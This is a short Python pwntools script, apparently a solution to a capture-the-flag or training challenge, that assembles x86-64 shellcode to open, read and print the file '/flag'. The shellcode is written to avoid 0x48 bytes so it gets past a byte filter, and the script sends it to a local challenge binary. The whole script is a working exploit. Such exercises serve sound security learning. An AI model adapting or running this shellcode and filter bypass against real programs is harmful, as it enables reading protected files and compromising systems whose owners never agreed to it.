#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = "debug"

target_binary = "/challenge/ello-ackers"

shellcode_asm = """
.global _start
_start:
.intel_syntax noprefix
    xor esi, esi
    push rsi
    push rsp
    pop rdi

    mov dword ptr [rdi], 0x616c662f
    mov byte ptr [rdi+4], 0x67
    push 2
    pop rax
    syscall

    xchg eax, edi
    push rsp
    pop rsi
    mov dl, 100
    xor eax, eax
    syscall

    xchg eax, edx
    push 1
    pop rdi
    push 1
    pop rax
    syscall
"""

payload = asm(shellcode_asm)
print(payload)

log.info(f"Payload len: {len(payload)} bytes")
log.info(f"Payload Hex dump: \n{enhex(payload)}")

if b"\x48" in payload:
    log.error("detected 0x48 bytes in payload")
    exit(1)

p = process(target_binary)
p.send(payload)
p.interactive()
